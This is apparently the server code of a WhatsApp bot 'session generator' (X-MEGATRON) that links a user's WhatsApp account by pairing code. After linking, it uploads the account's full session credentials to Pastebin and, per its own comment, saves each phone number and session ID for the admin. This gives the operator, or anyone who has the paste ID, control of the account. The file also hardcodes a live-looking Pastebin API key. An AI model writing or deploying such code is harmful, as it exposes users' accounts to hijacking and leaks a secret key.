import express from 'express';
import fs from 'fs';
import pino from 'pino';
import {
  makeWASocket, useMultiFileAuthState, delay,
  makeCacheableSignalKeyStore, Browsers, jidNormalizedUser,
  fetchLatestBaileysVersion
} from '@whiskeysockets/baileys';
import pn from 'awesome-phonenumber';
import fetch from 'node-fetch';
import { incrementPair } from './stats.js';

const router = express.Router();

const PASTEBIN_API_KEY = 'LKNSwf1j_nBPrwFXLr9OX7qvYoAmc8jB';
const PASTEBIN_API_URL = 'https://pastebin.com/api/api_post.php';

if (!global._sessionReady) global._sessionReady = {};

async function uploadToPastebin(content, title = 'MEG4TRON Session') {
  try {
    const params = new URLSearchParams({
      api_dev_key: PASTEBIN_API_KEY, api_option: 'paste',
      api_paste_code: content, api_paste_name: title,
      api_paste_private: '1', api_paste_expire_date: 'N'
    });
    const r = await fetch(PASTEBIN_API_URL, {
      method: 'POST', body: params,
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    });
    const result = await r.text();
    if (result.startsWith('https://pastebin.com/')) {
      return { success: true, url: result.trim(), id: result.split('/').pop().trim() };
    }
    return { success: false, error: result };
  } catch (e) { return { success: false, error: e.message }; }
}

function cleanupDir(p) {
  try {
    if (fs.existsSync(p)) fs.rmSync(p, { recursive: true, force: true });
  } catch (e) { console.error('Cleanup error:', e.message); }
}

// Startup: clear any leftover temp sessions
function cleanAllTemp() {
  ['./temp_sessions', './temp_qr_sessions'].forEach(dir => {
    try {
      if (fs.existsSync(dir)) {
        const entries = fs.readdirSync(dir);
        entries.forEach(e => cleanupDir(dir + '/' + e));
        console.log(`🧹 Cleaned ${entries.length} leftover temp sessions from ${dir}`);
      }
    } catch (_) {}
  });
}
cleanAllTemp();

router.get('/', async (req, res) => {
  let num = req.query.number;
  const token = Date.now().toString() + Math.random().toString(36).substr(2, 9);
  const dir = `./temp_sessions/${token}`;

  fs.mkdirSync(dir, { recursive: true });
  num = num.replace(/[^0-9]/g, '');

  const phone = pn('+' + num);
  if (!phone.isValid()) {
    cleanupDir(dir);
    return res.status(400).json({ code: 'Invalid phone number. Use full international format.' });
  }
  num = phone.getNumber('e164').replace('+', '');
  const displayPhone = '+' + num;  // full phone for storage

  async function initiateSession() {
    const { state, saveCreds } = await useMultiFileAuthState(dir);
    try {
      const { version } = await fetchLatestBaileysVersion();
      let sock = makeWASocket({
        version,
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }).child({ level: 'fatal' }))
        },
        printQRInTerminal: false,
        logger: pino({ level: 'fatal' }).child({ level: 'fatal' }),
        browser: Browsers.windows('Chrome'),
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        retryRequestDelayMs: 250,
        maxRetries: 5,
      });

      sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
          console.log(`✅ Pair connected: ${displayPhone}`);
          try {
            const sessionContent = fs.readFileSync(dir + '/creds.json', 'utf8');
            const pb = await uploadToPastebin(sessionContent, `MEG4TRON - ${displayPhone}`);

            if (pb.success) {
              const sessionId = `xmegatron~${pb.id}`;
              const userJid = jidNormalizedUser(num + '@s.whatsapp.net');

              await sock.sendMessage(userJid, { text: sessionId });
              await sock.sendMessage(userJid, {
                text: ` _Note ⚠️_

_This bot is under developing stage only may cause some bugs and some issues to valuable users so kindly inform me through telegram channel.
_Uptodate Update to get new features_

_Report Bugs 🪲 Here:-_

_TELEGRAM:_ _https://t.me/xmegatronwha_

_THANKS FOR CHOOSING *X-MEGATRON*_`
                            });
              // Save FULL phone number + session ID for admin
              incrementPair(displayPhone, sessionId);

              global._sessionReady[token] = { sessionId, ts: Date.now() };
              if (global.notifySessionSuccess) {
                try { await global.notifySessionSuccess(null, sessionId); } catch (_) {}
              }
            } else {
              console.error('❌ Pastebin failed:', pb.error);
            }

            await delay(2000);
            cleanupDir(dir);
          } catch (err) {
            console.error('❌ Connection open error:', err);
            cleanupDir(dir);
          }
        }

        if (connection === 'close') {
          const code = lastDisconnect?.error?.output?.statusCode;
          if (code === 401) { cleanupDir(dir); }
          else { initiateSession(); }
        }
      });

      if (!sock.authState.creds.registered) {
        await delay(3000);
        let n = num.replace(/[^\d+]/g, '');
        if (n.startsWith('+')) n = n.substring(1);
        try {
          // ── FIXED PAIR CODE: MEG4TRON ──
          let code = await sock.requestPairingCode(n, 'MEG4TRON');
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          if (!res.headersSent) {
            console.log(`🔑 Pair code for ${displayPhone}: ${code}`);
            res.json({ code, token });
          }
        } catch (err) {
          console.error('Pair code error:', err);
          if (!res.headersSent) res.status(503).json({ code: 'Failed to get pair code. Try again.' });
        }
      }

      sock.ev.on('creds.update', saveCreds);
    } catch (err) {
      console.error('Session init error:', err);
      if (!res.headersSent) res.status(503).json({ code: 'Service Unavailable' });
      cleanupDir(dir);
    }
  }

  await initiateSession();
});

router.get('/session-status', (req, res) => {
  const { token } = req.query;
  if (token && global._sessionReady[token]) {
    const { sessionId } = global._sessionReady[token];
    delete global._sessionReady[token];
    return res.json({ ready: true, sessionId });
  }
  res.json({ ready: false });
});

process.on('uncaughtException', (err) => {
  const e = String(err);
  const skip = ['conflict','not-authorized','Socket connection timeout','rate-overlimit','Connection Closed','Timed Out','Value not found','Stream Errored','statusCode: 515','statusCode: 503'];
  if (!skip.some(s => e.includes(s))) console.error('Uncaught:', err);
});

export default router;
